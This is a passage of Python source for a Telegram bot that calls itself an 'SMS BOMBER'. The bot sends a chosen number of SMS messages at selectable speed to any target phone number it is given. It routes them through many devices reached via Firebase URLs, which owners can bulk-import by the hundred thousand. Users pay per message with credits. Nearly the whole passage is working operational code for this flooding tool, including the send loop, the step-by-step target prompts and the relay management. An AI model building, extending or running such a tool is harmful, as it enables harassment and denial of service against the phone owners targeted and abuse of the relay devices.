            fb_url, dev_id, sim, fb_id = job
            ok = await send_sms_via_device(fb_url, dev_id, sim, number, message)
            
            async with session.lock:
                if ok:
                    sent_ok += 1
                    if is_regular:
                        d_temp = load()
                        deduct_credits(uid, 1, d_temp)
                        d_temp["stats"]["total_sent"] = d_temp["stats"].get("total_sent", 0) + 1
                        k = str(uid)
                        if k in d_temp["users"]:
                            d_temp["users"][k]["uses"] = d_temp["users"][k].get("uses", 0) + 1
                        d_temp.setdefault("sms_history", {}).setdefault(k, []).append({
                            "number": number, "message": message[:100],
                            "timestamp": int(time.time()), "status": "sent"
                        })
                        save(d_temp)
                else:
                    sent_fail += 1
                msgs_left -= 1
                
                if fb_id not in api_usage_delta:
                    api_usage_delta[fb_id] = {"sent": 0, "failed": 0}
                api_usage_delta[fb_id]["sent" if ok else "failed"] += 1
                
                now = time.time()
                if (now - last_update >= _PROGRESS_UPDATE_INTERVAL or
                    (sent_ok + sent_fail) >= count or session.cancelled):
                    current_credits_live = get_user_credits(uid, load()) if is_regular else None
                    try:
                        await progress_msg.edit_text(
                            progress_text(sent_ok, sent_fail, count, current_credits_live, speed_label),
                            reply_markup=stop_send_kb() if not session.cancelled else None,
                            parse_mode="HTML"
                        )
                    except TelegramBadRequest:
                        pass
                    except TelegramRetryAfter as e:
                        await asyncio.sleep(e.retry_after)
                    last_update = now
            
            await asyncio.sleep(speed)
    
    # Launch all tasks
    tasks = [asyncio.create_task(do_one(i, job)) for i, job in enumerate(send_jobs)]
    session.task = asyncio.gather(*tasks, return_exceptions=True)
    
    try:
        await session.task
    except Exception as e:
        log.error(f"Send loop err: {e}")
    finally:
        async with session.lock:
            session.sent = sent_ok
            session.failed = sent_fail
    
    was_cancelled = session.cancelled
    
    async with SESSIONS_LOCK:
        if uid in USER_SESSIONS:
            del USER_SESSIONS[uid]
    
    # Final save
    d_final = load()
    if not is_regular:
        d_final["stats"]["total_sent"] = d_final["stats"].get("total_sent", 0) + sent_ok
        d_final["stats"]["total_failed"] = d_final["stats"].get("total_failed", 0) + sent_fail
    for fb_id, delta in api_usage_delta.items():
        d_final["stats"].setdefault("api_usage", {}).setdefault(fb_id, {"sent": 0, "failed": 0})
        d_final["stats"]["api_usage"][fb_id]["sent"] += delta["sent"]
        d_final["stats"]["api_usage"][fb_id]["failed"] += delta["failed"]
    k = str(uid)
    if k in d_final["users"]:
        d_final["users"][k]["uses"] = d_final["users"][k].get("uses", 0) + sent_ok
    d_final.setdefault("sms_history", {}).setdefault(k, []).append({
        "number": number, "message": message[:100],
        "timestamp": int(time.time()),
        "status": "completed" if not was_cancelled else "stopped"
    })
    save(d_final)
    
    # Log
    duration = int(time.time() - start_time)
    log_activity(d_final, "sms_blast", uid, f"sent={sent_ok} fail={sent_fail} dur={duration}s")
    save(d_final)
    
    # Channel log
    try:
        user_chat = await bot.get_chat(uid)
        u_name = user_chat.full_name or "Unknown"
        u_uname = f"@{user_chat.username}" if user_chat.username else "No"
    except:
        u_name = d_final.get("users", {}).get(str(uid), {}).get("name", "?")
        u_uname = "No"
    chan_log = (
        f"🚀 <b>SMS BLAST</b>\n\n"
        f"👤 {u_name}\n🆔 <code>{uid}</code>\n🌐 {u_uname}\n"
        f"📞 <code>{number}</code>\n💬 <code>{message[:80]}</code>\n"
        f"✅ Sent: <b>{sent_ok}</b>\n❌ Fail: <b>{sent_fail}</b>\n"
        f"📊 Req: <b>{count}</b>\n⏱ {fmt_duration(duration)}\n"
        f"🛑 {'STOPPED' if was_cancelled else 'COMPLETED'}"
    )
    asyncio.create_task(send_channel_log(bot, chan_log))
    
    # Final result message
    icon = em(EMOJI_CHECK, "✅") if sent_fail == 0 and sent_ok > 0 else em(EMOJI_WARNING, "⚠️") if sent_ok > 0 else em(EMOJI_CROSS, "❌")
    credit_text = ""
    if is_regular:
        remaining = get_user_credits(uid, load())
        credit_text = f"\n{em(EMOJI_MONEY, '💰')} Used: <b>{sent_ok}</b> | Remaining: <b>{remaining}</b>"
    stopped_text = f"\n{em(EMOJI_CROSS, '🛑')} <b>User stopped!</b>" if was_cancelled else ""
    
    if is_owner(uid, load()):
        back = [btn("ᴏᴡɴᴇʀ ᴘᴀɴᴇʟ", "owner:home", EMOJI_GEAR, "🔙", style="primary")]
    elif is_admin(uid, load()):
        back = [btn("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", "admin:home", EMOJI_GEAR, "🔙", style="primary")]
    else:
        back = [
            btn("sᴇɴᴅ ᴀɢᴀɪɴ", "user:send", EMOJI_ROCKET, "📤", style="success"),
            btn("ʜᴏᴍᴇ", "user:home", EMOJI_STAR, "🏠", style="primary")
        ]
    
    try:
        await progress_msg.edit_text(
            f"{icon} <b>SMS Blast Result</b>{stopped_text}\n\n"
            f"{em(EMOJI_PHONE, '📞')} To: <code>{mask_number(number)}</code>\n"
            f"{em(EMOJI_STAR, '💬')} Msg: <code>{message[:50]}</code>\n"
            f"{em(EMOJI_CHECK, '✅')} Sent: <b>{sent_ok}</b>\n"
            f"{em(EMOJI_CROSS, '❌')} Failed: <b>{sent_fail}</b>\n"
            f"{em(EMOJI_FIRE, '🔥')} APIs: <b>{len(api_usage_delta)}</b>\n"
            f"{em(EMOJI_GEAR, '⏱')} Time: <b>{fmt_duration(int(time.time() - start_time))}</b>"
            f"{credit_text}",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[back]),
            parse_mode="HTML"
        )
    except Exception:
        pass

# ═══════════════════════════════════════════════════════════════
# ║  SEND FLOWS — user / owner / admin
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    if not GLOBAL_LIMITER.is_allowed(cq.from_user.id):
        await cq.answer("⚠️ Slow down!", show_alert=True)
        return
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join!", show_alert=True)
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML")
        return
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True)
        return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\n"
        f"Target number:\n<i>e.g. +919876543210</i>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.send_number)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid number!", parse_mode="HTML")
        return
    if number in PROTECTED_NUMBERS:
        await msg.answer(f"{em(EMOJI_LOCK, '🔒')} <b>Protected number!</b>", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <code>{mask_number(number)}</code>\n\n"
        f"{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')} — {sc('message')}</b>",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.send_message)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Saved!\n\n{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>",
        reply_markup=speed_kb("user"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    speed_map = {"user:speed:fast": SPEED_FAST, "user:speed:medium": SPEED_MEDIUM, "user:speed:slow": SPEED_SLOW}
    sel = speed_map.get(cq.data, SPEED_FAST)
    label = "🚀 FAST" if sel == SPEED_FAST else "⚡ MEDIUM" if sel == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=sel)
    await state.set_state(S.send_count)
    devices = get_cached_devices() or await get_all_online_devices(d)
    count = len(devices)
    credit_info = ""
    if not is_admin(uid, d) and not is_owner(uid, d):
        uc = get_user_credits(uid, d)
        credit_info = f"\n{em(EMOJI_MONEY, '💰')} Credits: <b>{uc}</b>"
    await cq.message.edit_text(
        f"{label} <b>selected!</b>\n\n"
        f"{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online: <b>{count}</b> devices\n"
        f"{em(EMOJI_CHECK, '📤')} Capacity: <b>{count * 3}</b> SMS{credit_info}\n\n"
        f"Kitne SMS bhejna hai?",
        reply_markup=kb([(f"{sc('cancel')}", "user:home")]),
        parse_mode="HTML"
    )

@R.message(S.send_count)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number!", parse_mode="HTML")
        return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    speed = fsmd.get("send_speed", SPEED_FAST)
    if not is_admin(uid, d) and not is_owner(uid, d):
        cur = get_user_credits(uid, d)
        if cur <= 0:
            await msg.answer(
                f"{em(EMOJI_CROSS, '❌')} <b>No credits!</b>\n\nBuy credits first.",
                reply_markup=kb([(f"{sc('home')}", "user:home")]),
                parse_mode="HTML"
            )
            return
        if count > cur:
            await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Sirf {cur} credits hain! {cur} bhej raha hoon...")
            count = cur
    devices = get_cached_devices() or await get_all_online_devices(d)
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} No APIs online!", reply_markup=kb([(f"{sc('home')}", "user:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, speed)

# ─── OWNER SEND ───
@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.set_state(S.owner_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Owner SMS Send</b>\n\n{em(EMOJI_PHONE, '📞')} <b>step 1/4</b>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_number)
async def owner_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid!", parse_mode="HTML")
        return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <code>{number}</code>\n\n{em(EMOJI_STAR, '💬')} <b>step 2/4</b>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_message)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Saved!\n\n{em(EMOJI_ROCKET, '⚡')} <b>step 3/4</b>",
        reply_markup=speed_kb("owner"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {"owner:speed:fast": SPEED_FAST, "owner:speed:medium": SPEED_MEDIUM, "owner:speed:slow": SPEED_SLOW}
    sel = speed_map.get(cq.data, SPEED_FAST)
    label = "🚀 FAST" if sel == SPEED_FAST else "⚡ MEDIUM" if sel == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=sel)
    await state.set_state(S.owner_send_count)
    devices = get_cached_devices() or await get_all_online_devices(load())
    await cq.message.edit_text(
        f"{label} <b>selected!</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online: <b>{len(devices)}</b>\n\n"
        f"<b>step 4/4</b> — Kitne SMS?",
        reply_markup=kb([(f"{sc('cancel')}", "owner:home")]),
        parse_mode="HTML"
    )

@R.message(S.owner_send_count)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid!", parse_mode="HTML")
        return
    await state.clear()
    devices = get_cached_devices() or await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} No APIs!", reply_markup=kb([(f"{sc('back')}", "owner:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(
        msg.bot, msg, msg.from_user.id,
        fsmd.get("number", ""), fsmd.get("message", ""),
        count, devices, fsmd.get("send_speed", SPEED_FAST)
    )

# ─── ADMIN SEND ───
@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True)
        return
    await state.set_state(S.admin_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_SHIELD, '🛡')} <b>Admin SMS Send</b>\n\n{em(EMOJI_PHONE, '📞')} <b>step 1/4</b>",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_number)
async def admin_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid!", parse_mode="HTML")
        return
    if number in PROTECTED_NUMBERS:
        d = load()
        if not is_owner(msg.from_user.id, d) and msg.from_user.id != PROTECTED_NUMBERS[number]:
            await msg.answer(f"{em(EMOJI_LOCK, '🔒')} Protected!", parse_mode="HTML")
            return
    await state.update_data(number=number)
    await state.set_state(S.admin_send_message)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <code>{mask_number(number)}</code>\n\n{em(EMOJI_STAR, '💬')} <b>step 2/4</b>",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_message)
async def admin_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.admin_send_speed)
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Saved!\n\n{em(EMOJI_ROCKET, '⚡')} <b>step 3/4</b>",
        reply_markup=speed_kb("admin"),
        parse_mode="HTML"
    )

@R.callback_query(F.data.in_({"admin:speed:fast", "admin:speed:medium", "admin:speed:slow"}))
async def admin_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {"admin:speed:fast": SPEED_FAST, "admin:speed:medium": SPEED_MEDIUM, "admin:speed:slow": SPEED_SLOW}
    sel = speed_map.get(cq.data, SPEED_FAST)
    label = "🚀 FAST" if sel == SPEED_FAST else "⚡ MEDIUM" if sel == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=sel)
    await state.set_state(S.admin_send_count)
    devices = get_cached_devices() or await get_all_online_devices(load())
    await cq.message.edit_text(
        f"{label} <b>selected!</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Online: <b>{len(devices)}</b>\n\n"
        f"<b>step 4/4</b> — Kitne SMS?",
        reply_markup=kb([(f"{sc('cancel')}", "admin:home")]),
        parse_mode="HTML"
    )

@R.message(S.admin_send_count)
async def admin_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid!", parse_mode="HTML")
        return
    await state.clear()
    devices = get_cached_devices() or await get_all_online_devices(load())
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} No APIs!", reply_markup=kb([(f"{sc('back')}", "admin:home")]), parse_mode="HTML")
        return
    await run_sms_blast_with_progress(
        msg.bot, msg, msg.from_user.id,
        fsmd.get("number", ""), fsmd.get("message", ""),
        count, devices, fsmd.get("send_speed", SPEED_FAST)
    )

@R.callback_query(F.data == "user:stop_send")
async def user_stop_send(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    async with SESSIONS_LOCK:
        s = USER_SESSIONS.get(uid)
        if not s or (s.task and s.task.done()):
            await cq.answer("✅ Already done!", show_alert=True)
            return
        s.cancelled = True
    await cq.answer("🛑 Stopping...", show_alert=True)

# ═══════════════════════════════════════════════════════════════
# ║  TOP MANAGE VIDEO — SINGLE VIDEO WITH CAPTION
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:top_video:menu")
async def owner_top_video_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    top = d.get("top_video")
    text = f"{em(EMOJI_TOP, '⭐')} <b>Top Manage Video</b>\n\n"
    if top:
        text += (
            f"{em(EMOJI_CHECK, '✅')} <b>Active Top Video Set</b>\n\n"
            f"{em(EMOJI_VIDEO, '📹')} File ID: <code>{top['file_id'][:30]}...</code>\n"
            f"{em(EMOJI_STAR, '💬')} Caption:\n<pre>{(top.get('caption') or '')[:300]}</pre>\n\n"
            f"<i>Yeh video sabhi users ko /start par dikhega.</i>"
        )
    else:
        text += (
            f"{em(EMOJI_CROSS, '❌')} <b>Koi top video set nahi hai.</b>\n\n"
            f"Set karne ke baad yeh video + caption sabhi users ko /start par dikhega.\n"
            f"Video na hone par sirf text panel dikhega (with inline buttons)."
        )
    await cq.message.edit_text(text, reply_markup=top_video_menu_kb(d), parse_mode="HTML")

@R.callback_query(F.data == "owner:top_video:set")
async def owner_top_video_set(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.add_top_video)
    await cq.message.edit_text(
        f"{em(EMOJI_TOP, '⭐')} <b>Set Top Video</b>\n\n"
        f"Video bhejiye (ya URL/File ID).\n\n"
        f"<i>Video ke saath jo caption bhejenge wahi caption use hoga.</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:top_video:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_top_video)
async def owner_top_video_received(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    
    file_id = None
    caption = msg.caption or ""
    
    if msg.video:
        file_id = msg.video.file_id
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"):
        file_id = msg.document.file_id
    elif msg.text and msg.text.strip().startswith(("http", "BAAD", "AgAD", "BQAC")):
        file_id = msg.text.strip()
    
    if not file_id:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid video/URL/File ID bhejo!", parse_mode="HTML")
        return
    
    if not caption:
        await msg.answer(
            f"{em(EMOJI_WARNING, '⚠️')} Video ke saath caption nahi mila.\n"
            f"Abhi default caption set ho raha hai.",
            parse_mode="HTML"
        )
        caption = (
            f"{em(EMOJI_ROCKET, '🚀')} <b>Welcome to AYUSH SMS BOMBER!</b>\n\n"
            f"{em(EMOJI_CROWN, '👑')} Owner: {SUPER_ADMIN_NAME}\n"
            f"{em(EMOJI_FIRE, '🔥')} Fast & Reliable SMS Service"
        )
    
    d["top_video"] = {
        "file_id": file_id,
        "caption": caption,
        "set_by": msg.from_user.id,
        "set_at": int(time.time())
    }
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Top Video Set!</b>\n\n"
        f"{em(EMOJI_STAR, '💬')} Caption:\n<pre>{caption[:300]}</pre>",
        reply_markup=top_video_menu_kb(load()),
        parse_mode="HTML"
    )
    log_activity(d, "top_video_set", msg.from_user.id, f"set video")
    save(d)

@R.callback_query(F.data == "owner:top_video:remove")
async def owner_top_video_remove(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    d["top_video"] = None
    save(d)
    await cq.answer("🗑 Top video removed!", show_alert=True)
    await owner_top_video_menu(cq, state)

# ═══════════════════════════════════════════════════════════════
# ║  VIDEO MANAGER
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:videos:menu")
async def owner_videos_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    videos = d.get("videos", [])
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO, '📹')} <b>Video Manager</b>\n\nTotal: <b>{len(videos)}</b>",
        reply_markup=videos_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:videos:add")
async def owner_videos_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    await state.set_state(S.add_video)
    await cq.message.edit_text(
        f"{em(EMOJI_VIDEO, '📹')} <b>Add Video</b>\n\nVideo send karein:",
        reply_markup=kb([(f"{sc('cancel')}", "owner:videos:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_video)
async def owner_videos_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_admin(msg.from_user.id, d):
        await state.clear()
        return
    file_id = None
    if msg.video:
        file_id = msg.video.file_id
    elif msg.document and msg.document.mime_type and msg.document.mime_type.startswith("video"):
        file_id = msg.document.file_id
    elif msg.text:
        file_id = msg.text.strip()
    if not file_id:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid video!", parse_mode="HTML")
        return
    d.setdefault("videos", []).append(file_id)
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} Video added!",
        reply_markup=videos_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data.startswith("owner:videos:del:"))
async def owner_videos_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    idx = int(cq.data.split("owner:videos:del:", 1)[1])
    videos = d.get("videos", [])
    if 0 <= idx < len(videos):
        videos.pop(idx)
        d["videos"] = videos
        save(d)
        await cq.answer("🗑 Removed!")
    await owner_videos_menu(cq, state)

@R.callback_query(F.data == "owner:videos:bulk_del")
async def owner_videos_bulk_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Access Denied!", show_alert=True)
        return
    d["videos"] = []
    save(d)
    await cq.answer("🗑 All videos deleted!", show_alert=True)
    await owner_videos_menu(cq, state)

# ═══════════════════════════════════════════════════════════════
# ║  FIREBASE MANAGER
# ═══════════════════════════════════════════════════════════════
@R.callback_query(F.data == "owner:fb:menu")
async def owner_fb_menu(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True)
        return
    await state.clear()
    bot_fbs = d.get("firebases", [])
    backup_fbs = d.get("backup_firebases", [])
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Firebase Manager</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Bot-added: <b>{len(bot_fbs)}</b>\n"
        f"{em(EMOJI_GEAR, '📁')} Backup (firebase.txt): <b>{len(backup_fbs)}</b>\n"
        f"{em(EMOJI_STAR, '📊')} Total Active: <b>{len(bot_fbs) + len(backup_fbs)}</b>\n\n"
        f"<i>Dono merge hokar scan hote hain. Bot-added priority rakhta hai.</i>",
        reply_markup=fb_menu_kb(d),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add")
async def owner_fb_add_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Add Firebase</b>\n\n"
        f"Format: <code>Label | URL</code>\n"
        f"e.g. <code>MyApp | https://myapp.firebaseio.com</code>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase)
async def owner_fb_add_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    text = msg.text.strip()
    if "|" in text:
        parts = text.split("|", 1)
        label, url = parts[0].strip(), parts[1].strip()
    else:
        url = text
        label = url.replace("https://", "").split(".")[0][:20]
    if not url.startswith("http"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} URL must start with http!", parse_mode="HTML")
        return
    url = url.rstrip("/")
    fbs = d.get("firebases", [])
    if any(fb["url"] == url for fb in fbs) or any(fb["url"] == url for fb in d.get("backup_firebases", [])):
        await state.clear()
        await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Already exists!", reply_markup=fb_menu_kb(d), parse_mode="HTML")
        return
    fb_id = str(int(time.time()))
    fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await msg.answer(
        f"{em(EMOJI_CHECK, '✅')} <b>Added!</b>\n\n{em(EMOJI_STAR, '🏷')} {label}\n{em(EMOJI_GEAR, '🔗')} <code>{url}</code>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.callback_query(F.data == "owner:fb:add_file")
async def owner_fb_add_file_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    await state.set_state(S.add_firebase_file)
    await cq.message.edit_text(
        f"{em(EMOJI_FIRE, '🔥')} <b>Bulk Add Firebase (.txt)</b>\n\n"
        f"Ek <code>.txt</code> file upload karein (1 lakh+ lines bhi chalegi).\n\n"
        f"<b>Supported formats:</b>\n"
        f"• <code>https://myapp.firebaseio.com</code>\n"
        f"• <code>Label | https://myapp.firebaseio.com</code>\n\n"
        f"<i>Duplicate auto-skip.</i>",
        reply_markup=kb([(f"{sc('cancel')}", "owner:fb:menu")]),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file, F.document)
async def owner_fb_add_file_done(msg: Message, state: FSMContext):
    d = load()
    if not is_owner(msg.from_user.id, d):
        await state.clear()
        return
    doc = msg.document
    if not doc.file_name.endswith(".txt"):
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf .txt file!", parse_mode="HTML")
        return
    status_msg = await msg.answer(f"{em(EMOJI_GEAR, '⏳')} Downloading...")
    try:
        file_info = await msg.bot.get_file(doc.file_id)
        downloaded = await msg.bot.download_file(file_info.file_path)
        content = downloaded.read().decode("utf-8", errors="ignore")
    except Exception as e:
        await status_msg.edit_text(f"{em(EMOJI_CROSS, '❌')} Download failed: {e}")
        return
    
    fbs = d.get("firebases", [])
    existing = {fb["url"].rstrip("/") for fb in fbs}
    existing |= {fb["url"].rstrip("/") for fb in d.get("backup_firebases", [])}
    
    added = skipped = 0
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        if "|" in line:
            p = line.split("|", 1)
            label, url = p[0].strip(), p[1].strip()
        else:
            url = line
            label = url.replace("https://", "").replace("http://", "").split(".")[0][:24]
        if not (url.startswith("http://") or url.startswith("https://")):
            continue
        url = url.rstrip("/")
        if url in existing:
            skipped += 1
            continue
        existing.add(url)
        fb_id = str(int(time.time() * 1000) + random.randint(100, 999))
        fbs.append({"id": fb_id, "url": url, "label": label, "added_at": int(time.time())})
        added += 1
    d["firebases"] = fbs
    save(d)
    await state.clear()
    await status_msg.edit_text(
        f"{em(EMOJI_CHECK, '✅')} <b>Bulk Add Complete</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} Added: <b>{added}</b>\n"
        f"{em(EMOJI_WARNING, '⚠️')} Skipped: <b>{skipped}</b>\n"
        f"{em(EMOJI_STAR, '📊')} Total: <b>{len(fbs)}</b>",
        reply_markup=fb_menu_kb(load()),
        parse_mode="HTML"
    )

@R.message(S.add_firebase_file)
async def owner_fb_add_file_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} .txt document upload karein!", parse_mode="HTML")

@R.callback_query(F.data == "owner:fb:reload_backup")
async def owner_fb_reload_backup(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    backup = load_backup_firebases()
    d["backup_firebases"] = backup
    save(d)
    await cq.answer(f"✅ Reloaded {len(backup)} firebases!", show_alert=True)
    await owner_fb_menu(cq, state)

@R.callback_query(F.data == "owner:fb:clear_backup")
async def owner_fb_clear_backup(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    d["backup_firebases"] = []
    d["_backup_mtime"] = 0
    save(d)
    await cq.answer("🗑 Backup cleared!", show_alert=True)
    await owner_fb_menu(cq, state)

@R.callback_query(F.data.startswith("owner:fb:del:"))
async def owner_fb_del(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner Only!", show_alert=True)
        return
    fb_id = cq.data.split("owner:fb:del:", 1)[1]
    d["firebases"] = [fb for fb in d["firebases"] if fb["id"] != fb_id]
    save(d)
